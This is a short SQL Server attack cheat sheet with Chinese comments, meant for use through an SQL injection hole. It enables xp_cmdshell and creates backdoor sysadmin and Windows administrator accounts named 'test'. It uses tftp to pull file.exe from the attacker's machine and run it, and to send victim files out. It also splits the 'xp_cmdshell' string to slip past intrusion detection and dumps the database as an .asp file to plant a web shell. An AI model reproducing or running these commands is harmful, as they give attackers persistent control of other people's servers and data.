


select name from master.dbo.sysdatabases where dbid>=7  

select * from CHIS.dbo.sysobjects WHERE xtype ='u' 

 
EXEC sp_configure 'show advanced options', 1
GO 
RECONFIGURE
GO 
EXEC sp_configure 'xp_cmdshell', 1
GO 
RECONFIGURE
GO
exec master.dbo.sp_addlogin test,test;					-- //添加数据库用户用户test,密码为test
exec master.dbo.sp_password test,123456,test;			-- //如果想改密码，则用这句（将test的密码改为123456）
exec master.dbo.sp_addsrvrolemember test,sysadmin;		-- //将test加到sysadmin组,这个组的成员可执行任何操作
exec master.dbo.xp_cmdshell 'net user test test /add';	-- //添加系统用户test,密码为test
exec master.dbo.xp_cmdshell 'net localgroup administrators test /add';-- //将系统用户test提升为管理员


--通过SQLSERVER注入漏洞建数据库管理员帐号和系统管理员帐号[当前帐号必须是SYSADMIN组]
 

--这样，你在他的数据库和系统内都留下了test管理员账号了


--下面是如何从你的服器下载文件file.exe后运行它[前提是你必须将你的电脑设为TFTP服务器，将69端口打开]


exec master.dbo.xp_cmdshell 'tftp –i 192.168 get file.exe';--


--然后运行这个文件：
exec master.dbo.xp_cmdshell 'file.exe';--


--下载服务器的文件file2.doc到本地TFTP服务器[文件必须存在]:


exec master.dbo.xp_cmdshell 'tftp –i 你的IP Put file2.doc';--


--绕过IDS的检测[使用变量]
declare @a sysname set @a='xp_'+'cmdshell' exec @a 'dir c:\'
declare @a sysname set @a='xp'+'_cm'+'dshell' exec @a 'dir c:\' 


--新加的：


--建一个表。只有一个字段，类型为image,将asp内容写入。导出数据库为文件
backup database dbname to disk='d:\web\db.asp'; 


--报错得到系统操作系统和数据库系统版本号
(select @@VERSION);


EXEC sys.sp_configure @configname = '', -- varchar(35)
    @configvalue = 0 -- int
